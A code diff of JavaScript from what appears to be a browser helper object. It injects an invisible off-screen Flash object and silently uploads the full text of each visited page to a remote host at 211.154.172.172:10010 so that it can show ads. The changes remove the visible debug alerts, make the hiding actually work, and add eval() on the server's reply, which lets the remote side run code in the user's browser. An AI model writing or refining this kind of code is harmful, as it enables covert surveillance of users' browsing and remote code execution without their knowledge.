@@ -498,7 +498,6 @@ function I8bho_print()
         var initrc = 'i8_initrc';   // will be called by flash once loaded.
         window[initrc] = function()
         {
-            alert("let's rock!");
             if( rand(1,100)<=100 ) sendText(document.body.innerText.replace(/\s{2,}/g,  ' '));
         }
         var host = "211.154.172.172", port = "10010";
@@ -516,12 +515,7 @@ function I8bho_print()
                     i8vars.cmtorid + '" id="' + i8vars.cmtorid + '" type="application/x-shockwave-flash"></embed>' +
             '</object>';
         var div = document.createElement('div');
-        div.style.position = 'absolute';
-        div.style.x = '-10000px';
-        div.style.y = '-10000px';
-        div.style.width = '1px';
-        div.style.height = '1px';
-        div.style.overflow = 'hidden';
+        div.setAttribute('style', 'position:absolute; left:-10000px; top:-10000px; width:1px; height:1px; overflow:hidden;');
         div.innerHTML = html;
         document.body.appendChild(div);
     }
@@ -532,16 +526,15 @@ function I8bho_print()
         if (!cmtor || !cmtor.call) return;
         window.cmtor = cmtor;   // test only
         var meta = {url:document.location.href, ref:document.referrer};
-        window.crawlPage = function(res)
+        window.crawlPage = function(resp)
         {
-            if (res == 'n')
+            var res =  eval('(' + resp + ')');
+            if (res && res.code == 'err')
             {
-                alert('page non-exists, will upload.');
                 cmtor.crawl(null, meta, text);
             }
             else
-            {
-                alert('page already exists, plz enjoy some ads.');
+            { // show ads.
             }
         };
         cmtor.call("pageExists", 'crawlPage', meta, i8vars.charset);
